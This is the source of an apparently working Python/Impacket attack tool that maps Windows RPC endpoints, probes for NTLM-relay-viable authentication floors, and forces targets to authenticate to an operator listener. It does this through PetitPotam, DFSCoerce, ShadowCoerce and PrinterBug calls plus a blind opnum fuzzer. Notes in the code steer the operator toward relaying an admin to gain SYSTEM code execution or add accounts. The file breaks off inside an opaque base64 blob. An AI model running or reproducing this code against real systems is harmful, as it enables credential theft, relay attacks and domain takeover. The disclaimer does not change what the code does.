#!/usr/bin/env python3
# rpcauthmap.py  (v2)
#
# RPC endpoint mapper + capability classifier + authentication-coercion prober
# (Impacket / Python 3). Based originally on CORE/Fortra's rpcdump.py and the
# ifids/brute approach of impacket's rpcmap.py; coercion method definitions are
# adapted from public PoCs (topotam PetitPotam, DFSCoerce, ShadowCoerce).
#
# WHAT IT DOES, per target, in stages:
#
#   STAGE 1  DISCOVERY  -- find every RPC interface, not just the advertised ones
#     1a. Endpoint-mapper query (TCP/135): returns each registered interface and
#         its exact bindings, including the dynamic ncacn_ip_tcp high port, so no
#         port scan is needed for those.
#     1b. Named-pipe enumeration over SMB (\\host\IPC$): lists pipes that exist
#         whether or not the endpoint mapper advertised them.
#     1c. MGMT inq_if_ids: ask each reachable endpoint which interface UUIDs it
#         actually serves, surfacing interfaces the mapper never listed.
#     1d. UUID brute-bind (hunt mode): confirm presence of known UUIDs on
#         an endpoint whose management interface refuses to answer.
#     Both transports are considered: an interface exposed on ncacn_ip_tcp but not
#     on a pipe (or vice versa) is still found and recorded.
#
#   STAGE 2  CLASSIFY  -- say what each interface *can* do, not just its name
#     Every discovered UUID is looked up in a known-interface table for a human
#     name, and in a coercion table that marks interfaces with a method that
#     takes a REMOTE-TARGET argument (a UNC path, a \\server name, or a share),
#     i.e. the shape that can be made to authenticate outbound. "Takes a path" is
#     only the EFS-flavoured subset; server/share arguments count too.
#
#   STAGE 3  RELAY-DESTINATION PROBE  -- (original behaviour, preserved)
#     For each interface, bind at escalating auth levels to find the lowest the
#     server accepts (its enforced floor):
#         none      -> unauthenticated bind allowed
#         connect   -> authenticated but UNSIGNED bind allowed  (relay-viable IN)
#         integrity -> packet integrity (signing) required
#         privacy   -> integrity + encryption required
#     A relayed NTLM session cannot sign, so a "connect" floor = candidate relay
#     DESTINATION. This is about relaying TO the endpoint.
#
#   STAGE 4  COERCION PROBE  -- (opt-in with --coerce)  "level 1"
#     For interfaces in the curated catalog, actually call the known triggering
#     method with a UNC pointing at our own listener, then watch a local listener
#     for an inbound connection from the target within --callback-wait seconds. A
#     callback = confirmed coercion SOURCE. This is about the endpoint emitting
#     auth to YOU. Requires a listener bind (default TCP/445) and an --listener-ip
#     the target can route back to. Fired only against methods whose argument we
#     hardcode, because the exact call is proven.
#
#   STAGE 5  TARGETED FUZZ  -- (opt-in with --fuzz)  "level 2"
#     For an interface we DISCOVER on the target that also appears in a candidates
#     file (built from an NtObjectManager IDL dump via make_candidates.py), blind-
#     fire each listed opnum with a UNC in every wide-string argument and watch the
#     same listener. This turns "this method takes a string" into a yes/no on
#     "forces outbound auth" without knowing the real method name. Only methods
#     whose every [in] arg is a string or simple scalar are fired; context-handle/
#     struct/array methods are skipped. Loud: throttled with --delay/--jitter,
#     capped with --max, and --dry-run lists without firing.
#
# OUTPUT: by default only positive / interesting rows are shown (relay-viable
# destinations, and confirmed/ candidate coercion sources). --verbose/--show-all
# prints every interface and every dead host. Colour highlights the hits.
#
# For AUTHORIZED security testing only. Coercion actively induces the target to
# authenticate to you; do not run --coerce outside an engagement with scope.

import os
import sys
import ssl
import time
import socket
import logging
import argparse
import ipaddress
import threading
import http.client
from concurrent.futures import ThreadPoolExecutor, as_completed

# ldap3 is optional; only needed for the LDAP/LDAPS relay-destination probes.
try:
    from ldap3 import Server, Connection, NTLM, Tls
    _HAVE_LDAP3 = True
except ImportError:
    _HAVE_LDAP3 = False

try:
    from impacket import version, uuid as iuuid
    from impacket.dcerpc.v5 import transport, epm, rprn
    from impacket.dcerpc.v5.ndr import NDRCALL
    from impacket.dcerpc.v5.dtypes import WSTR, ULONG, LPWSTR, DWORD, NULL
    from impacket.dcerpc.v5.rpcrt import (
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHN_LEVEL_NONE,
        RPC_C_AUTHN_LEVEL_CONNECT,
        RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        DCERPCException,
    )
    from impacket.dcerpc.v5 import mgmt
    from impacket.uuid import (uuidtup_to_bin, bin_to_uuidtup, string_to_bin,
                               bin_to_string)
    from impacket.smbconnection import SMBConnection
except ImportError as e:
    sys.stderr.write('[-] impacket import failed: %s\n'
                     '    Install/upgrade impacket in the same interpreter: '
                     'pip install --upgrade impacket --break-system-packages\n' % e)
    sys.exit(1)


# --------------------------------------------------------------------------- #
# Colour
# --------------------------------------------------------------------------- #
class C:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[31m'
    BRED = '\033[1;31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    CYAN = '\033[36m'
    GREY = '\033[90m'
    BBLUE = '\033[94m'  # bright blue


_NOCOLOR = False


def c(text, colour):
    if _NOCOLOR:
        return text
    return '%s%s%s' % (colour, text, C.RESET)


import re as _re
_ANSI = _re.compile(r'\033\[[0-9;]*m')


def strip_ansi(s):
    return _ANSI.sub('', s)


# --------------------------------------------------------------------------- #
# Auth levels, lowest -> highest. 'none' is unauthenticated; rest use NTLMSSP.
# --------------------------------------------------------------------------- #
AUTH_LEVELS = [
    ('none', RPC_C_AUTHN_LEVEL_NONE),
    ('connect', RPC_C_AUTHN_LEVEL_CONNECT),
    ('integrity', RPC_C_AUTHN_LEVEL_PKT_INTEGRITY),
    ('privacy', RPC_C_AUTHN_LEVEL_PKT_PRIVACY),
]

# A "connect" or "none" floor means no signing is enforced -> relay-viable IN.
RELAY_VIABLE_FLOORS = ('none', 'connect')


# --------------------------------------------------------------------------- #
# Known interface names (subset; extend freely). UUID (lowercase) -> label.
# --------------------------------------------------------------------------- #
KNOWN_INTERFACES = {
    'c681d488-d850-11d0-8c52-00c04fd90f7e': 'MS-EFSR (EFS, via lsarpc)',
    'df1941c5-fe89-4e79-bf10-463657acf44d': 'MS-EFSR (EFS, via efsrpc)',
    '12345678-1234-abcd-ef00-0123456789ab': 'MS-RPRN (Print System Remote)',
    '76f03f96-cdfd-44fc-a22c-64950a001209': 'MS-PAR (Print Async Remote)',
    '4fc742e0-4a10-11cf-8273-00aa004ae673': 'MS-DFSNM (DFS Namespace Mgmt)',
    'a8e0653c-2744-4389-a61d-7373df8b2292': 'MS-FSRVP (File Server VSS)',
    '12345778-1234-abcd-ef00-0123456789ac': 'MS-SAMR (SAM Remote)',
    '12345778-1234-abcd-ef00-0123456789ab': 'MS-LSAD/LSARPC',
    '367abb81-9844-35f1-ad32-98f038001003': 'MS-SCMR (Service Control)',
    '86d35949-83c9-4044-b424-db363231fd0c': 'MS-TSCH (Task Scheduler)',
    '378e52b0-c0a9-11cf-822d-00aa0051e40f': 'MS-TSCH (ATSvc)',
    'f6beaff7-1e19-4fbb-9f8f-b89e2018337c': 'MS-EVEN6 (EventLog)',
    '338cd001-2244-31f1-aaaa-900038001003': 'MS-RRP (Remote Registry)',
    '3919286a-b10c-11d0-9ba8-00c04fd92ef5': 'MS-DSSP (Directory Services)',
}


# Attacker-oriented note per interface: what relaying in / reaching it buys you,
# or that it is a coercion source. Keyed by lowercase UUID.
INTERFACE_NOTES = {
    '367abb81-9844-35f1-ad32-98f038001003':
        'SCMR: create/start a service = RCE as SYSTEM (PsExec-style). '
        'Relay an ADMIN here.',
    '12345778-1234-abcd-ef00-0123456789ac':
        'SAMR: read/add/modify local accounts (e.g. add a local admin), '
        'enumerate users.',
    '12345778-1234-abcd-ef00-0123456789ab':
        'LSARPC: enumerate SIDs, trusts, privileges, policy.',
    '86d35949-83c9-4044-b424-db363231fd0c':
        'Task Scheduler: create a scheduled task = code execution.',
    '378e52b0-c0a9-11cf-822d-00aa0051e40f':
        'Task Scheduler (ATSvc): schedule a task = code execution.',
    '1ff70682-0a51-30e8-076d-740be8cee98b':
        'Task Scheduler (ATSvc): schedule a task = code execution.',
    'f6beaff7-1e19-4fbb-9f8f-b89e2018337c':
        'EVEN6: read/clear the Windows event logs.',
    '338cd001-2244-31f1-aaaa-900038001003':
        'Remote Registry: read/write registry remotely (e.g. save SAM/SYSTEM '
        'hives).',
    '3919286a-b10c-11d0-9ba8-00c04fd92ef5':
        'DSSP: directory-services setup / role info.',
    '12345678-1234-abcd-ef00-0123456789ab':
        'SPOOLER: coercion source (PrinterBug) - forces machine-account auth '
        'outbound.',
    '76f03f96-cdfd-44fc-a22c-64950a001209':
        'Async print: same coercion surface as the spooler.',
    '4fc742e0-4a10-11cf-8273-00aa004ae673':
        'DFSNM: coercion source (DFSCoerce) - forces outbound auth.',
    'c681d488-d850-11d0-8c52-00c04fd90f7e':
        'EFSR via lsarpc: coercion source (PetitPotam) - forces outbound auth.',
    'df1941c5-fe89-4e79-bf10-463657acf44d':
        'EFSR via efsrpc: coercion source (PetitPotam) - forces outbound auth.',
    'a8e0653c-2744-4389-a61d-7373df8b2292':
        'FSRVP: coercion source (ShadowCoerce) - forces outbound auth.',
    '4b324fc8-1670-01d3-1278-5a47bf6ee188':
        'Server service (srvsvc): enumerate shares and sessions.',
    '6bffd098-a112-3610-9833-46c3f87e345a':
        'Workstation service (wkssvc): enumerate logged-on users, domain info.',
    '51a227ae-825b-41f2-b4a9-1ac9557a1018':
        'NGC key service (lsass): credential/key surface.',
    '8fb74744-b2ff-4c00-be0d-9ef9a191fe1b':
        'NGC key service (lsass): credential/key surface.',
    'b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86':
        'KeyIso (lsass): key isolation / DPAPI-NG surface.',
}


# --------------------------------------------------------------------------- #
# Coercion method definitions.
#
# Each entry: interface label, the pipe(s) it is reachable on, the interface
# UUID+version to bind, and a list of trigger methods. Each trigger is a
# callable fire(dce, unc) that issues the request with `unc` placed in the
# remote-target argument and returns None (we only care that it was sent; the
# server throwing ERROR_BAD_NETPATH / rpc_s_* after dialing us is success).
#
# We define the minimal NDRCALL structures inline (same approach as the public
# PoCs) so the tool does not depend on those modules being importable.
# --------------------------------------------------------------------------- #

# ---- MS-EFSR ----
class _EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (('fileName', WSTR), ('Flag', ULONG))


class _EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (('FileName', WSTR),)


# All fire(dce, unc, host) functions: `unc` is the \\listener\share\file path we
# want the target to dial, `host` is the target (needed by the spooler's open).
def _fire_efs_openfileraw(dce, unc, host):
    r = _EfsRpcOpenFileRaw()
    r['fileName'] = unc + '\x00'
    r['Flag'] = 0
    dce.request(r)


def _fire_efs_encryptfilesrv(dce, unc, host):
    r = _EfsRpcEncryptFileSrv()
    r['FileName'] = unc + '\x00'
    dce.request(r)


# ---- MS-DFSNM : NetrDfsAddStdRoot (opnum 12) ----
class _NetrDfsAddStdRoot(NDRCALL):
    opnum = 12
    structure = (
        ('ServerName', WSTR),
        ('RootShare', WSTR),
        ('Comment', WSTR),
        ('ApiFlags', DWORD),
    )


def _fire_dfs_addstdroot(dce, unc, host):
    # unc is \\listener ; strip leading slashes for ServerName
    server = unc.lstrip('\\')
    r = _NetrDfsAddStdRoot()
    r['ServerName'] = server + '\x00'
    r['RootShare'] = 'x\x00'
    r['Comment'] = '\x00'
    r['ApiFlags'] = 0
    dce.request(r)


# ---- MS-FSRVP : IsPathSupported (opnum 8) ----
class _IsPathSupported(NDRCALL):
    opnum = 8
    structure = (('ShareName', WSTR),)


def _fire_fsrvp_ispathsupported(dce, unc, host):
    r = _IsPathSupported()
    r['ShareName'] = unc + '\\x\x00'
    dce.request(r)


# ---- MS-RPRN : the spooler (printerbug). Two calls on the same binding:
# open a handle to the target's own print server, then ask it to send change
# notifications to \\listener, which makes it authenticate outbound to us. This
# is why the spooler cannot be a one-shot blind fuzz target. ----
def _fire_rprn(dce, unc, host):
    # listener host is the first element of the \\listener\share\file path
    listener = unc.lstrip('\\').split('\\')[0]
    resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % host)
    handle = resp['pHandle']
    req = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
    req['hPrinter'] = handle
    req['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
    req['fdwOptions'] = 0
    req['pszLocalMachine'] = '\\\\%s\x00' % listener
    req['dwPrinterLocal'] = 0
    req['pOptions'] = NULL
    dce.request(req)


# interface_uuid (lowercase) -> coercion descriptor
COERCION_DB = {
    'c681d488-d850-11d0-8c52-00c04fd90f7e': {
        'label': 'MS-EFSR',
        'uuidtup': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0'),
        'pipes': ['lsarpc', 'efsrpc', 'samr', 'lsass', 'netlogon'],
        'triggers': [
            ('EfsRpcOpenFileRaw', 'fileName', _fire_efs_openfileraw),
            ('EfsRpcEncryptFileSrv', 'FileName', _fire_efs_encryptfilesrv),
        ],
    },
    'df1941c5-fe89-4e79-bf10-463657acf44d': {
        'label': 'MS-EFSR (efsrpc iface)',
        'uuidtup': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0'),
        'pipes': ['efsrpc'],
        'triggers': [
            ('EfsRpcOpenFileRaw', 'fileName', _fire_efs_openfileraw),
            ('EfsRpcEncryptFileSrv', 'FileName', _fire_efs_encryptfilesrv),
        ],
    },
    '4fc742e0-4a10-11cf-8273-00aa004ae673': {
        'label': 'MS-DFSNM',
        'uuidtup': ('4fc742e0-4a10-11cf-8273-00aa004ae673', '3.0'),
        'pipes': ['netdfs'],
        'triggers': [
            ('NetrDfsAddStdRoot', 'ServerName', _fire_dfs_addstdroot),
        ],
    },
    'a8e0653c-2744-4389-a61d-7373df8b2292': {
        'label': 'MS-FSRVP',
        'uuidtup': ('a8e0653c-2744-4389-a61d-7373df8b2292', '1.0'),
        'pipes': ['FssagentRpc'],
        'triggers': [
            ('IsPathSupported', 'ShareName', _fire_fsrvp_ispathsupported),
        ],
    },
    '12345678-1234-abcd-ef00-0123456789ab': {
        'label': 'MS-RPRN (Print Spooler)',
        'uuidtup': ('12345678-1234-abcd-ef00-0123456789ab', '1.0'),
        'pipes': ['spoolss'],
        'triggers': [
            # two-call open-printer + notify sequence (handled inside the fire fn)
            ('RpcRemoteFindFirstPrinterChangeNotificationEx', 'pszLocalMachine',
             _fire_rprn),
        ],
    },
}

RPRN_UUID = '12345678-1234-abcd-ef00-0123456789ab'

# Expected "it dialed us then failed to find the file" errors == coercion sent.
# Used by the level-1 curated coerce path, where access-denied after a dial is a
# known PetitPotam-style success signal.
_EXPECTED_COERCE_ERRORS = (
    'ERROR_BAD_NETPATH', 'rpc_s_access_denied', 'ERROR_BAD_NET_NAME',
    'STATUS_BAD_NETWORK_NAME', 'ERROR_ACCESS_DENIED', 'STATUS_OBJECT_PATH_NOT_FOUND',
)

# Stricter set for the level-2 blind fuzz: ONLY path-resolution failures, which
# are the closest thing to "the server treated the string as a remote path".
# Access-denied is deliberately excluded here, because for an unknown method it
# usually means the call was refused, not that anything was dialed, and treating
# it as a hit floods the output with false LIKELYs.
_FUZZ_REACHOUT_ERRORS = (
    'ERROR_BAD_NETPATH', 'ERROR_BAD_NET_NAME', 'STATUS_BAD_NETWORK_NAME',
    'STATUS_OBJECT_PATH_NOT_FOUND',
)


# --------------------------------------------------------------------------- #
# LEVEL-2 TARGETED FUZZ ENGINE (opt-in --fuzz)
#
# The curated COERCION_DB above is "level 1": proven methods whose exact
# argument we hardcode. This is "level 2": for an interface we DISCOVER on the
# target and that appears in a candidates file (built from an NtObjectManager
# IDL dump), we blind-fire each listed opnum with a UNC in every wide-string
# argument and watch the listener. It turns "takes a string" into a yes/no on
# "forces outbound auth" without us knowing the real method name.
#
# It only handles methods whose every [in] argument is a wide string or a
# simple scalar (so we can marshal a plausible call). Methods needing a context
# handle, struct, or array are skipped as "needs setup", because a single blind
# call cannot satisfy them.
#
# Opnum numbering for UNDOCUMENTED interfaces is build-specific, so a candidates
# file from one Windows build may not line up with another. Regenerate it per
# target OS where it matters. Documented interfaces (EFS/DFS/FSRVP/spooler) are
# stable by spec and portable.
# --------------------------------------------------------------------------- #
_FUZZ_STRING_RE = _re.compile(r'wchar_t\s*\*|LPWSTR|PWSTR|LPCWSTR')
_FUZZ_UNIQUE_RE = _re.compile(r'\bunique\b|\bptr\b')
_FUZZ_UNSUPPORTED_RE = _re.compile(
    r'context_handle|GUID|_Struct|struct\b|\*\s*\*|size_is|\[\s*\]|'
    r'byte\s*\*|void\s*\*')
# scalar C-type -> impacket NDR scalar (checked in order; first match wins)
_FUZZ_SCALARS = None  # built lazily after impacket import is confirmed


def _fuzz_build_scalar_map():
    from impacket.dcerpc.v5 import ndr as _ndr
    from impacket.dcerpc.v5 import dtypes as _d
    return [
        (_re.compile(r'\bunsigned\s+__int64\b|\bunsigned\s+hyper\b'), _ndr.NDRUHYPER),
        (_re.compile(r'\b__int64\b|\bhyper\b'), _ndr.NDRHYPER),
        (_re.compile(r'\bunsigned\s+short\b|\bUSHORT\b'), _d.USHORT),
        (_re.compile(r'\bshort\b|\bSHORT\b'), _d.SHORT),
        (_re.compile(r'\bunsigned\s+char\b|\bUCHAR\b|\bbyte\b|\bBYTE\b|'
                     r'\bboolean\b'), _d.UCHAR),
        (_re.compile(r'\bchar\b|\bCHAR\b'), _d.UCHAR),
        (_re.compile(r'\bunsigned\b|\bULONG\b|\bDWORD\b'), _d.ULONG),
        (_re.compile(r'\b(int|long)\b|\bLONG\b|\bBOOL\b'), _d.LONG),
    ]


def _fuzz_split_params(sig_inside):
    parts, depth, buf = [], 0, ''
    for ch in sig_inside:
        if ch in '([':
            depth += 1; buf += ch
        elif ch in ')]':
            depth -= 1; buf += ch
        elif ch == ',' and depth == 0:
            parts.append(buf.strip()); buf = ''
        else:
            buf += ch
    if buf.strip():
        parts.append(buf.strip())
    return parts


def _fuzz_classify_param(p):
    """-> ('skip'|'binding'|'string'|'scalar'|'unsupported', ndrtype_or_None)."""
    global _FUZZ_SCALARS
    attrs = p[:p.find(']') + 1] if ']' in p else ''
    is_in = bool(_re.search(r'\bin\b', attrs))
    is_out_only = bool(_re.search(r'\bout\b', attrs)) and not is_in
    if is_out_only:
        return ('skip', None)
    if _re.search(r'\bhandle_t\b', p) and 'context_handle' not in p:
        return ('binding', None)
    if 'context_handle' in p:
        return ('unsupported', None)
    if _FUZZ_STRING_RE.search(p):
        if _re.search(r'wchar_t\s*\*\s*\*', p):   # out double-ptr string
            return ('unsupported', None)
        from impacket.dcerpc.v5 import dtypes as _d
        return ('string', _d.LPWSTR if _FUZZ_UNIQUE_RE.search(p) else _d.WSTR)
    if _FUZZ_UNSUPPORTED_RE.search(p):
        return ('unsupported', None)
    if _FUZZ_SCALARS is None:
        _FUZZ_SCALARS = _fuzz_build_scalar_map()
    for rx, t in _FUZZ_SCALARS:
        if rx.search(p):
            return ('scalar', t)
    return ('unsupported', None)


def _fuzz_build_call(opnum, params, unc):
    """Build an NDRCALL instance for a blind path-fire, or (None, reason)."""
    fields, kinds, n_str = [], [], 0
    for i, p in enumerate(params):
        kind, t = _fuzz_classify_param(p)
        if kind in ('skip', 'binding'):
            continue
        if kind == 'unsupported':
            return None, 'needs setup (ctx-handle/struct/array arg)'
        fields.append(('a%d' % i, t))
        kinds.append(kind)
        if kind == 'string':
            n_str += 1
    if n_str == 0:
        return None, 'no in-string arg'
    cls = type('FuzzCall_op%d' % opnum, (NDRCALL,),
               {'opnum': opnum, 'structure': tuple(fields)})
    inst = cls()
    for (fname, _t), kind in zip(fields, kinds):
        inst[fname] = (unc + '\x00') if kind == 'string' else 0
    return inst, 'ok'


# The default candidates list is baked into this script (gzip+base64 of the
# coercion_candidates.csv built from a Windows 11 24H2 box), so the tool is a
# single self-contained file. Pass --candidates FILE to override it with one you
# rebuilt for a specific target build (see make_candidates.py).
_EMBEDDED_CANDIDATES_B64 = """
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
